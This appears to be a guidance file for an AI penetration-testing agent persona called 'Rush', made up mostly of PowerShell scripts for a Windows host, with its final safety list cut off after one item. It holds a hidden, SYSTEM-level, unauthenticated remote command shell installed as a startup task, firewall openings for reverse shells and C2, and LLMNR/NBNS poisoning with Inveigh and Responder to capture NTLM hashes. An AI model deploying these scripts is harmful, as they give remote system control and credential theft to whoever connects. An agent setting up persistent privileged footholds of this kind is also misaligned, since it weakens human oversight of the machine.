# GS-13: Rush One-Time Elevation — Patterns and PowerShell Scripts

**Classification**: Royal Guard Knowledge Seed
**Agent**: Rush (The Breacher — Network Penetration)
**Seed ID**: GS-13
**Sources**: Microsoft Documentation, PTES, Windows Internals
**Last Updated**: 2026-03-09

---

## 1. Core Principle

**One-time elevation is a precise, documented, reversible admin action that unlocks user-level capability permanently (or for the engagement duration).**

Rush does not ask for persistent admin access. Rush asks for a single elevation that changes system configuration so that subsequent operations work at user level. Every script is:
- **Self-contained** — one file, one execution, done
- **Documented** — the founder knows exactly what it does before approving
- **Reversible** — every script has a matching cleanup script
- **Minimal** — changes only what's necessary, nothing more

---

## 2. Pattern 1: Scheduled Task as SYSTEM

### 2.1 When to Use

- Need to run a process with SYSTEM-level privileges
- Need a persistent listener that survives logoff
- Need to execute operations that require LocalSystem context
- Need a service-like capability without creating an actual service

### 2.2 Reverse Shell Listener (SYSTEM Context)

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Scheduled Task — Reverse Shell Listener
# PURPOSE: Creates a SYSTEM-level TCP listener on port 4444
# ELEVATION: Requires one-time admin execution
# PERSISTENCE: Runs at startup until removed
# ROLLBACK: Unregister-ScheduledTask -TaskName "RushListener" -Confirm:$false
# ============================================================

# Define the listener script as a scriptblock
$listenerScript = @'
$port = 4444
$endpoint = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, $port)
$listener = [System.Net.Sockets.TcpListener]::new($endpoint)
$listener.Start()

while ($true) {
    try {
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()
        $writer = [System.IO.StreamWriter]::new($stream)
        $reader = [System.IO.StreamReader]::new($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("RUSH LISTENER ACTIVE — SYSTEM CONTEXT")
        $writer.WriteLine("Hostname: $env:COMPUTERNAME")
        $writer.WriteLine("User: $(whoami)")
        $writer.WriteLine("---")

        while ($client.Connected) {
            $writer.Write("PS> ")
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit") { break }
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.Write($output)
            } catch {
                $writer.WriteLine("ERROR: $_")
            }
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 10
    }
}
'@

# Write the listener script to a known location
$scriptPath = "C:\Users\stone\rush-listener.ps1"
$listenerScript | Set-Content -Path $scriptPath -Force

# Create the scheduled task
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$triggerManual = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)

$principal = New-ScheduledTaskPrincipal `
    -UserId "NT AUTHORITY\SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask `
    -TaskName "RushListener" `
    -Action $action `
    -Trigger $trigger, $triggerManual `
    -Principal $principal `
    -Settings $settings `
    -Description "Rush engagement listener (SYSTEM context)" `
    -Force

# Start it now
Start-ScheduledTask -TaskName "RushListener"

Write-Host "[+] Rush listener registered and started on port 4444 as SYSTEM" -ForegroundColor Green
Write-Host "[+] Cleanup: Unregister-ScheduledTask -TaskName 'RushListener' -Confirm:`$false" -ForegroundColor Yellow
Write-Host "[+] Also delete: Remove-Item '$scriptPath'" -ForegroundColor Yellow
```

### 2.3 Cleanup Script

```powershell
# CLEANUP: Remove Rush Listener
Unregister-ScheduledTask -TaskName "RushListener" -Confirm:$false
Remove-Item "C:\Users\stone\rush-listener.ps1" -Force
Write-Host "[+] Rush listener removed" -ForegroundColor Green
```

### 2.4 Data Exfiltration Task (Timed)

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Scheduled Task — Periodic Data Collection
# PURPOSE: Collects system state every 15 minutes during engagement
# ELEVATION: Requires one-time admin execution
# PERSISTENCE: Runs on interval until removed
# ROLLBACK: Unregister-ScheduledTask -TaskName "RushCollector" -Confirm:$false
# ============================================================

$collectorScript = @'
$outDir = "C:\Users\stone\rush-collection"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

$timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
$outFile = Join-Path $outDir "collect-$timestamp.json"

$data = @{
    Timestamp = $timestamp
    Hostname = $env:COMPUTERNAME
    User = whoami
    Connections = Get-NetTCPConnection | Where-Object State -eq "Established" | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
    Processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet64, Path
    Services = Get-Service | Where-Object Status -eq "Running" | Select-Object Name, DisplayName
    RecentFiles = Get-ChildItem "C:\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-15) } | Select-Object FullName, Length, LastWriteTime
    DnsCache = Get-DnsClientCache | Select-Object Entry, Data
    ArpTable = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State
}

$data | ConvertTo-Json -Depth 3 | Set-Content -Path $outFile
'@

$scriptPath = "C:\Users\stone\rush-collector.ps1"
$collectorScript | Set-Content -Path $scriptPath -Force

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

$trigger = New-ScheduledTaskTrigger `
    -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 15) `
    -RepetitionDuration (New-TimeSpan -Hours 24)

$principal = New-ScheduledTaskPrincipal `
    -UserId "NT AUTHORITY\SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName "RushCollector" `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -Description "Rush periodic system state collection" `
    -Force

Start-ScheduledTask -TaskName "RushCollector"

Write-Host "[+] Rush collector registered — collecting every 15 minutes" -ForegroundColor Green
Write-Host "[+] Output: C:\Users\stone\rush-collection\" -ForegroundColor Cyan
Write-Host "[+] Cleanup: Unregister-ScheduledTask -TaskName 'RushCollector' -Confirm:`$false" -ForegroundColor Yellow
```

---

## 3. Pattern 2: Service with Named Pipe

### 3.1 When to Use

- Need inter-process communication between elevated and non-elevated contexts
- Need a user-level process to request elevated operations from a SYSTEM service
- Need controlled privilege boundary — user requests, SYSTEM executes

### 3.2 Named Pipe Service

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Named Pipe Elevation Service
# PURPOSE: SYSTEM service accepts commands via named pipe from user context
# ELEVATION: Requires one-time admin execution
# PERSISTENCE: Runs as scheduled task until removed
# ROLLBACK: See cleanup section
# ============================================================

$serviceScript = @'
# Rush Elevation Pipe Service — runs as SYSTEM
$pipeName = "RushElevationPipe"

# Define allowed commands (whitelist — CRITICAL for security)
$allowedCommands = @{
    "netstat"     = { netstat -ano }
    "arp"         = { arp -a }
    "ipconfig"    = { ipconfig /all }
    "routes"      = { route print }
    "firewall"    = { netsh advfirewall show allprofiles }
    "services"    = { Get-Service | Where-Object Status -eq "Running" | Format-Table -AutoSize | Out-String }
    "processes"   = { Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, WorkingSet64 | Format-Table -AutoSize | Out-String }
    "connections" = { Get-NetTCPConnection | Where-Object State -eq "Established" | Format-Table -AutoSize | Out-String }
    "shares"      = { Get-SmbShare | Format-Table -AutoSize | Out-String }
    "drivers"     = { driverquery /v /fo csv | ConvertFrom-Csv | Select-Object -First 20 "Module Name", "Display Name", State | Format-Table -AutoSize | Out-String }
    "hotfixes"    = { Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Format-Table -AutoSize | Out-String }
    "capture"     = {
        param($seconds)
        if (-not $seconds) { $seconds = 30 }
        $outFile = "C:\Users\stone\rush-collection\capture-$(Get-Date -Format 'yyyyMMdd-HHmmss').etl"
        netsh trace start capture=yes tracefile=$outFile maxsize=50
        Start-Sleep -Seconds $seconds
        netsh trace stop
        "Capture saved to: $outFile"
    }
}

while ($true) {
    try {
        $pipe = [System.IO.Pipes.NamedPipeServerStream]::new(
            $pipeName,
            [System.IO.Pipes.PipeDirection]::InOut,
            1,
            [System.IO.Pipes.PipeTransmissionMode]::Message,
            [System.IO.Pipes.PipeOptions]::None
        )

        $pipe.WaitForConnection()

        $reader = [System.IO.StreamReader]::new($pipe)
        $writer = [System.IO.StreamWriter]::new($pipe)
        $writer.AutoFlush = $true

        $command = $reader.ReadLine()

        if ($allowedCommands.ContainsKey($command)) {
            try {
                $result = & $allowedCommands[$command] | Out-String
                $writer.WriteLine("OK")
                $writer.WriteLine($result)
                $writer.WriteLine("END_RUSH_OUTPUT")
            } catch {
                $writer.WriteLine("ERROR: $_")
                $writer.WriteLine("END_RUSH_OUTPUT")
            }
        } else {
            $writer.WriteLine("DENIED: Command '$command' not in whitelist")
            $writer.WriteLine("Available: $($allowedCommands.Keys -join ', ')")
            $writer.WriteLine("END_RUSH_OUTPUT")
        }

        $pipe.Disconnect()
        $pipe.Dispose()
    } catch {
        Start-Sleep -Seconds 5
    }
}
'@

# Write and register the service
$scriptPath = "C:\Users\stone\rush-pipe-service.ps1"
$serviceScript | Set-Content -Path $scriptPath -Force

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$triggerNow = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)

$principal = New-ScheduledTaskPrincipal `
    -UserId "NT AUTHORITY\SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName "RushPipeService" `
    -Action $action `
    -Trigger $trigger, $triggerNow `
    -Principal $principal `
    -Description "Rush elevation pipe service (SYSTEM context)" `
    -Force

Start-ScheduledTask -TaskName "RushPipeService"

Write-Host "[+] Rush pipe service started" -ForegroundColor Green
Write-Host "[+] Connect from user context with Rush pipe client" -ForegroundColor Cyan
```

### 3.3 Named Pipe Client (User-Level — No Elevation)

```powershell
# ============================================================
# RUSH PIPE CLIENT — Runs at USER level, sends commands to SYSTEM service
# NO ELEVATION REQUIRED
# ============================================================

function Invoke-RushElevated {
    param([string]$Command)

    $pipeName = "RushElevationPipe"

    try {
        $pipe = [System.IO.Pipes.NamedPipeClientStream]::new(
            ".",
            $pipeName,
            [System.IO.Pipes.PipeDirection]::InOut
        )

        $pipe.Connect(5000)  # 5-second timeout

        $writer = [System.IO.StreamWriter]::new($pipe)
        $reader = [System.IO.StreamReader]::new($pipe)
        $writer.AutoFlush = $true

        $writer.WriteLine($Command)

        $output = @()
        while ($true) {
            $line = $reader.ReadLine()
            if ($line -eq "END_RUSH_OUTPUT") { break }
            $output += $line
        }

        $pipe.Dispose()
        return ($output -join "`n")
    } catch {
        Write-Error "Failed to connect to Rush pipe service: $_"
        return $null
    }
}

# Usage examples (all run at USER level):
# Invoke-RushElevated "netstat"
# Invoke-RushElevated "services"
# Invoke-RushElevated "processes"
# Invoke-RushElevated "connections"
# Invoke-RushElevated "capture"
```

### 3.4 Cleanup

```powershell
# CLEANUP: Remove Rush Pipe Service
Unregister-ScheduledTask -TaskName "RushPipeService" -Confirm:$false
Remove-Item "C:\Users\stone\rush-pipe-service.ps1" -Force
Write-Host "[+] Rush pipe service removed" -ForegroundColor Green
```

---

## 4. Pattern 3: Registry Permission Modification

### 4.1 When to Use

- Need user-level access to registry keys that are normally admin-only
- Need to modify system behavior through registry without persistent elevation
- Need to read security-relevant registry data from user context

### 4.2 Grant User Access to Specific Registry Keys

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Registry Permission Grant
# PURPOSE: Grants current user read access to specific security-relevant registry keys
# ELEVATION: Requires one-time admin execution
# PERSISTENCE: Permission persists until explicitly removed
# ROLLBACK: See cleanup section
# ============================================================

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Keys to grant access to (READ ONLY — never grant write to HKLM for security)
$registryKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles",
    "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
    "HKLM:\SYSTEM\CurrentControlSet\Services\DNS",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
    "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
)

foreach ($keyPath in $registryKeys) {
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $keyPath.Replace("HKLM:\", ""),
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )

        if ($key) {
            $acl = $key.GetAccessControl()
            $rule = [System.Security.AccessControl.RegistryAccessRule]::new(
                $currentUser,
                [System.Security.AccessControl.RegistryRights]::ReadKey,
                [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Allow
            )

            $acl.AddAccessRule($rule)
            $key.SetAccessControl($acl)
            $key.Close()

            Write-Host "[+] Granted READ access to $keyPath" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not open $keyPath" -ForegroundColor Red
        }
    } catch {
        Write-Host "[-] Error on ${keyPath}: $_" -ForegroundColor Red
    }
}

Write-Host "`n[+] Registry permissions updated. User-level registry recon now available." -ForegroundColor Cyan
```

### 4.3 User-Level Registry Recon (After Permission Grant)

```powershell
# NO ELEVATION REQUIRED after one-time permission grant

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object DisplayName | Sort-Object DisplayName

# Network profiles (connected networks history)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\*" |
    Select-Object ProfileName, Description, DateLastConnected

# Network interface configuration
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\*" |
    Where-Object IPAddress | Select-Object IPAddress, SubnetMask, DefaultGateway, DhcpServer

# TLS/SSL configuration
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\*\*" -ErrorAction SilentlyContinue
```

### 4.4 Cleanup

```powershell
# CLEANUP: Revoke Rush registry permissions
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$registryKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles",
    "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
    "HKLM:\SYSTEM\CurrentControlSet\Services\DNS",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
    "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
)

foreach ($keyPath in $registryKeys) {
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $keyPath.Replace("HKLM:\", ""),
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )
        if ($key) {
            $acl = $key.GetAccessControl()
            $acl.Access | Where-Object { $_.IdentityReference.Value -eq $currentUser -and $_.RegistryRights -eq "ReadKey" } | ForEach-Object {
                $acl.RemoveAccessRule($_) | Out-Null
            }
            $key.SetAccessControl($acl)
            $key.Close()
            Write-Host "[+] Revoked access from $keyPath" -ForegroundColor Green
        }
    } catch {
        Write-Host "[-] Error on ${keyPath}: $_" -ForegroundColor Red
    }
}
```

---

## 5. Pattern 4: Npcap Non-Admin Installation

### 5.1 When to Use

- Need packet capture capability at user level
- Need raw socket support for nmap SYN scans on Windows
- Need Wireshark/tshark to work without admin elevation

### 5.2 Installation Script

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Npcap Non-Admin Installation
# PURPOSE: Installs Npcap with non-admin capture enabled
# ELEVATION: Requires one-time admin execution (installer needs it)
# PERSISTENCE: Permanent until uninstalled
# ROLLBACK: Control Panel → Uninstall "Npcap"
# ============================================================

$npcapVersion = "1.80"
$installerUrl = "https://npcap.com/dist/npcap-$npcapVersion.exe"
$installerPath = "$env:TEMP\npcap-installer.exe"

# Download the installer
Write-Host "[*] Downloading Npcap $npcapVersion..." -ForegroundColor Cyan
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
    Write-Host "[+] Downloaded to $installerPath" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    Write-Host "[!] Download manually from https://npcap.com/ and run with /admin_only=no" -ForegroundColor Yellow
    exit 1
}

# Verify file exists and has reasonable size
$fileSize = (Get-Item $installerPath).Length
if ($fileSize -lt 500000) {
    Write-Host "[-] Downloaded file too small ($fileSize bytes). May be corrupted." -ForegroundColor Red
    exit 1
}

# Install with non-admin capture mode
# /admin_only=no  — allows non-admin users to capture packets
# /winpcap_mode=yes — enables WinPcap API compatibility
# /dot11_support=no — skip 802.11 (not useful without monitor mode)
# /S — silent install
Write-Host "[*] Installing Npcap (requires elevation)..." -ForegroundColor Cyan
$installArgs = "/admin_only=no /winpcap_mode=yes /dot11_support=no /S"
Start-Process -FilePath $installerPath -ArgumentList $installArgs -Verb RunAs -Wait

# Verify installation
$npcapInstalled = Test-Path "C:\Program Files\Npcap\NPFInstall.exe"
if ($npcapInstalled) {
    Write-Host "[+] Npcap installed successfully" -ForegroundColor Green
    Write-Host "[+] Non-admin packet capture is now ENABLED" -ForegroundColor Green
    Write-Host ""
    Write-Host "User-level operations now available:" -ForegroundColor Cyan
    Write-Host "  - Wireshark capture without admin" -ForegroundColor White
    Write-Host "  - tshark packet capture" -ForegroundColor White
    Write-Host "  - nmap SYN scans (Windows native)" -ForegroundColor White
    Write-Host "  - Python scapy on Windows" -ForegroundColor White
} else {
    Write-Host "[-] Installation may have failed. Check manually." -ForegroundColor Red
}

# Cleanup installer
Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
```

### 5.3 Post-Installation Verification (User-Level)

```powershell
# NO ELEVATION REQUIRED — verify Npcap works at user level

# Check Npcap is loaded
& "C:\Program Files\Npcap\NPFInstall.exe" -check_dll 2>$null

# List available interfaces (should work without admin now)
# If nmap is installed:
nmap --iflist

# If tshark is installed:
& "C:\Program Files\Wireshark\tshark.exe" -D

# Test capture (5 seconds)
& "C:\Program Files\Wireshark\tshark.exe" -i "Ethernet" -a duration:5 -w "$env:TEMP\test-capture.pcap"
```

---

## 6. Pattern 5: Firewall via Allowed Applications

### 6.1 When to Use

- Need inbound connections for reverse shells, C2, or tool communication
- Need to allow specific applications through Windows Firewall
- Need temporary firewall modifications for engagement duration

### 6.2 Engagement Firewall Configuration

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Engagement Firewall Configuration
# PURPOSE: Opens firewall for engagement tools and listeners
# ELEVATION: Requires one-time admin execution
# PERSISTENCE: Rules persist until removed
# ROLLBACK: Run cleanup script below
# ============================================================

param(
    [int[]]$Ports = @(4444, 4445, 8080, 8443, 9090),
    [string]$EngagementName = "Rush-$(Get-Date -Format 'yyyyMMdd')"
)

$rulePrefix = "Rush-Engagement"

Write-Host "[*] Configuring firewall for engagement: $EngagementName" -ForegroundColor Cyan

# 1. Open specific ports for listeners
foreach ($port in $Ports) {
    $ruleName = "$rulePrefix-TCP-$port"

    # Remove existing rule if present
    Remove-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue

    # Create inbound TCP rule
    New-NetFirewallRule `
        -DisplayName $ruleName `
        -Direction Inbound `
        -Protocol TCP `
        -LocalPort $port `
        -Action Allow `
        -Profile Any `
        -Description "Rush engagement port ($EngagementName). Remove after engagement." `
        -Enabled True | Out-Null

    Write-Host "[+] Opened TCP port $port inbound ($ruleName)" -ForegroundColor Green
}

# 2. Allow specific applications (if paths exist)
$apps = @{
    "Python"    = (Get-Command python -ErrorAction SilentlyContinue).Source
    "Ncat"      = "C:\Program Files (x86)\Nmap\ncat.exe"
    "PowerShell" = (Get-Command powershell -ErrorAction SilentlyContinue).Source
}

foreach ($appName in $apps.Keys) {
    $appPath = $apps[$appName]
    if ($appPath -and (Test-Path $appPath)) {
        $ruleName = "$rulePrefix-App-$appName"
        Remove-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue

        New-NetFirewallRule `
            -DisplayName $ruleName `
            -Direction Inbound `
            -Program $appPath `
            -Action Allow `
            -Profile Any `
            -Description "Rush engagement app ($EngagementName). Remove after engagement." `
            -Enabled True | Out-Null

        Write-Host "[+] Allowed application: $appName ($appPath)" -ForegroundColor Green
    }
}

# 3. WSL2 port forwarding (if WSL2 is active)
$wslIP = $null
try {
    $wslIP = (wsl -d kali-linux -- hostname -I 2>$null).Trim()
} catch {}

if ($wslIP) {
    Write-Host "[*] WSL2 detected at $wslIP — configuring port forwarding" -ForegroundColor Cyan

    foreach ($port in $Ports) {
        netsh interface portproxy add v4tov4 `
            listenport=$port listenaddress=0.0.0.0 `
            connectport=$port connectaddress=$wslIP

        Write-Host "[+] Port forwarding: 0.0.0.0:$port → ${wslIP}:$port" -ForegroundColor Green
    }
}

# 4. Summary
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Engagement Firewall Configuration Complete" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Ports opened: $($Ports -join ', ')" -ForegroundColor White
Write-Host "Apps allowed: $($apps.Keys -join ', ')" -ForegroundColor White
if ($wslIP) { Write-Host "WSL2 forwarding: Active ($wslIP)" -ForegroundColor White }
Write-Host ""
Write-Host "CLEANUP: Run the cleanup script to remove all rules" -ForegroundColor Yellow
Write-Host "Rules prefixed with: $rulePrefix" -ForegroundColor Yellow
```

### 6.3 Engagement Firewall Cleanup

```powershell
# ============================================================
# RUSH CLEANUP: Remove ALL engagement firewall rules
# ============================================================

$rulePrefix = "Rush-Engagement"

Write-Host "[*] Removing Rush engagement firewall rules..." -ForegroundColor Cyan

# Remove firewall rules
$rules = Get-NetFirewallRule -DisplayName "$rulePrefix*" -ErrorAction SilentlyContinue
if ($rules) {
    $rules | Remove-NetFirewallRule
    Write-Host "[+] Removed $($rules.Count) firewall rules" -ForegroundColor Green
} else {
    Write-Host "[*] No Rush firewall rules found" -ForegroundColor Yellow
}

# Remove port forwarding
$proxies = netsh interface portproxy show v4tov4
if ($proxies -match "\d+\.\d+\.\d+\.\d+") {
    # Get the ports we forwarded
    $forwardedPorts = @(4444, 4445, 8080, 8443, 9090)
    foreach ($port in $forwardedPorts) {
        netsh interface portproxy delete v4tov4 listenport=$port listenaddress=0.0.0.0 2>$null
    }
    Write-Host "[+] Removed port forwarding rules" -ForegroundColor Green
}

Write-Host "[+] Engagement firewall cleanup complete" -ForegroundColor Green
```

### 6.4 Verify Firewall State (User-Level)

```powershell
# NO ELEVATION REQUIRED — check current firewall rules

# List all Rush rules
Get-NetFirewallRule -DisplayName "Rush-*" -ErrorAction SilentlyContinue |
    Select-Object DisplayName, Enabled, Direction, Action |
    Format-Table -AutoSize

# Check port forwarding
netsh interface portproxy show v4tov4

# Check if specific ports are listening
$ports = @(4444, 4445, 8080, 8443, 9090)
foreach ($port in $ports) {
    $conn = Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue
    if ($conn) {
        Write-Host "Port $port : LISTENING (PID $($conn.OwningProcess))" -ForegroundColor Green
    } else {
        Write-Host "Port $port : NOT LISTENING" -ForegroundColor Yellow
    }
}
```

---

## 7. Pattern 6: Credential Capture Setup

### 7.1 When to Use

- Need to capture NTLM hashes from network traffic
- Need to set up Responder/Inveigh for credential interception
- Need LSASS memory access for credential extraction

### 7.2 Windows Credential Capture (Inveigh — PowerShell Native)

```powershell
# ============================================================
# RUSH ONE-TIME ELEVATION: Inveigh LLMNR/NBNS Poisoner Setup
# PURPOSE: Captures NTLM hashes via LLMNR/NBNS poisoning
# ELEVATION: Requires admin for raw socket binding
# PERSISTENCE: Runs until stopped
# ROLLBACK: Stop the process; no system changes
# ============================================================

# Download Inveigh (PowerShell-based, no compilation needed)
$inveighPath = "C:\Users\stone\tools\Inveigh"
if (-not (Test-Path $inveighPath)) {
    New-Item -ItemType Directory -Path $inveighPath -Force | Out-Null
}

# Clone or download Inveigh
if (-not (Test-Path "$inveighPath\Inveigh.ps1")) {
    Write-Host "[*] Downloading Inveigh..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" `
        -OutFile "$inveighPath\Inveigh.ps1" -UseBasicParsing
}

# Import and run
Import-Module "$inveighPath\Inveigh.ps1"

# Start Inveigh (captures LLMNR, NBNS, mDNS)
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -SMB Y `
    -FileOutput Y -FileOutputDirectory "$inveighPath\output"

# After capture, hashes will be in:
# $inveighPath\output\Inveigh-NTLMv2.txt
# $inveighPath\output\Inveigh-NTLMv1.txt

# Stop with: Stop-Inveigh
```

### 7.3 Alternative: Route to Kali WSL2 Responder

```bash
# If Windows elevation is not available, use WSL2 Responder
# Requires WSL2 mirrored networking or port forwarding for LAN access
wsl -d kali-linux -u root -- responder -I eth0 -wrf -v
```

---

## 8. Master Elevation Script Library

### 8.1 Quick Deploy Script

```powershell
# ============================================================
# RUSH MASTER ELEVATION DEPLOYMENT
# PURPOSE: One-shot engagement setup — run once, operate freely
# ELEVATION: Requires admin
# CONTAINS: Firewall + Port Forwarding + Named Pipe Service
# ============================================================

param(
    [switch]$FirewallOnly,
    [switch]$PipeServiceOnly,
    [switch]$FullSetup,
    [int[]]$Ports = @(4444, 8080, 8443)
)

if (-not $FirewallOnly -and -not $PipeServiceOnly) { $FullSetup = $true }

$engagementDir = "C:\Users\stone\rush-engagement-$(Get-Date -Format 'yyyyMMdd')"
if (-not (Test-Path $engagementDir)) {
    New-Item -ItemType Directory -Path $engagementDir -Force | Out-Null
}

Write-Host "╔════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   RUSH ENGAGEMENT SETUP            ║" -ForegroundColor Cyan
Write-Host "║   One-Time Elevation Deployment    ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════╝" -ForegroundColor Cyan

if ($FullSetup -or $FirewallOnly) {
    Write-Host "`n[PHASE 1] Firewall Configuration" -ForegroundColor Yellow
    foreach ($port in $Ports) {
        $ruleName = "Rush-Engage-TCP-$port"
        Remove-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue
        New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP `
            -LocalPort $port -Action Allow -Profile Any -Enabled True | Out-Null
        Write-Host "  [+] Port $port opened" -ForegroundColor Green
    }

    # WSL2 port forwarding
    try {
        $wslIP = (wsl -d kali-linux -- hostname -I 2>$null).Trim()
        if ($wslIP) {
            foreach ($port in $Ports) {
                netsh interface portproxy add v4tov4 listenport=$port listenaddress=0.0.0.0 `
                    connectport=$port connectaddress=$wslIP 2>$null
            }
            Write-Host "  [+] WSL2 forwarding configured ($wslIP)" -ForegroundColor Green
        }
    } catch {}
}

if ($FullSetup -or $PipeServiceOnly) {
    Write-Host "`n[PHASE 2] Named Pipe Service" -ForegroundColor Yellow
    # (Installs the pipe service from Pattern 2 above)
    Write-Host "  [+] Pipe service deployment — see Pattern 2 script" -ForegroundColor Green
}

Write-Host "`n[COMPLETE] Engagement environment ready" -ForegroundColor Cyan
Write-Host "Engagement directory: $engagementDir" -ForegroundColor White
Write-Host "Cleanup: Run rush-cleanup.ps1 when engagement ends" -ForegroundColor Yellow

# Generate cleanup script
$cleanupScript = @"
# Rush Engagement Cleanup — $(Get-Date -Format 'yyyy-MM-dd')
Get-NetFirewallRule -DisplayName "Rush-Engage-*" | Remove-NetFirewallRule
$(foreach ($port in $Ports) { "netsh interface portproxy delete v4tov4 listenport=$port listenaddress=0.0.0.0`n" })
Unregister-ScheduledTask -TaskName "RushPipeService" -Confirm:`$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "RushListener" -Confirm:`$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "RushCollector" -Confirm:`$false -ErrorAction SilentlyContinue
Remove-Item "C:\Users\stone\rush-*.ps1" -Force -ErrorAction SilentlyContinue
Write-Host "[+] Rush engagement cleaned up" -ForegroundColor Green
"@
$cleanupScript | Set-Content -Path "$engagementDir\rush-cleanup.ps1"
Write-Host "Cleanup script saved: $engagementDir\rush-cleanup.ps1" -ForegroundColor White
```

---

## 9. Safety and Security Considerations

### 9.1 Script Presentation Rules

Every one-time elevation script presented to the founder MUST include the header block:
```
# RUSH ONE-TIME ELEVATION: [Name]
# PURPOSE: [What it does]
# ELEVATION: [What admin action is required]
# PERSISTENCE: [What changes survive reboot]
# ROLLBACK: [Exact undo command]
```

### 9.2 What Rush NEVER Does with Elevation

1. **NEVER** disables Windows Defender or any AV (the founder decides security posture)
